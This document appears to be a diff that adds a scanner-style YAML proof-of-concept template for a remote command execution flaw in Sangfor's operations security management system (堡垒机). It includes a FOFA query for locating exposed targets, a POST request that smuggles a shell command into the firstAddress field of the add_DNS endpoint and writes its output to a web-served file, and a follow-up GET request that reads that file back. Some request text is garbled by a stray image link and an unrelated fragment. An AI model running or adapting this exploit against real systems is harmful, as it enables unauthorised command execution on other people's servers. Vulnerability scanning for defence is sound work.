@@ -1,0 +1,65 @@
+id: poc-lvtplilevz36sxgq
+info:
+  name: 深信服运维安全管理系统add_DNS-存在命令执行漏洞
+  author: hacktwo
+  severity: critical
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/lvtplilevz36sxgq'
+  tags: rce,2026
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: lvtplilevz36sxgq
+    fofa: product="SANGFOR-运维安全管理系统"
+http:
+- raw:
+  - 'POST /fort/system;help/netConfig/add_DNS HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Content-Type: application/x-www-form-urlencoded
+
+    Connection: keep-alive
+
+    Cache-Control: max-age=0
+
+    sec-ch-ua: "Not(A:Brand";v="8", "Chromium";v="144", "Google Chrome";v="144"
+
+    sec-ch-ua-mobile: ?0
+
+    sec-ch-ua-platform: "Windows"
+
+    Upgrade-Insecure-Requests: 1
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36
+
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+
+    Sec-Fetch-Site: none
+
+    Sec-Fetch-Mode: navigate
+
+    Sec-Fetch-User: ?1
+
+    Sec-Fetch-Dest: document
+
+    Accept-Encoding: gzip, deflate, br, zstd
+
+    Accept-Language: zh-CN,zh;q=0.9
+
+
+    firstAddress=;whoami | tee /usr/local/tomcat/webapps/fort/trust/version/hello1.txt;&prepareAddress=8.8.8.8![](https://cdn.nlark.com/yuque/0/2026/png/43110909/1771858104302-270d3860-0dc3-4c33-9315-7360709b3561.png)'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
+- raw:
+  - 'GET /fort/trust/version/hello1.txt HTTP/1.1
+
+    Host: {{Hostname}}
+
+    prepareAddress参数'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
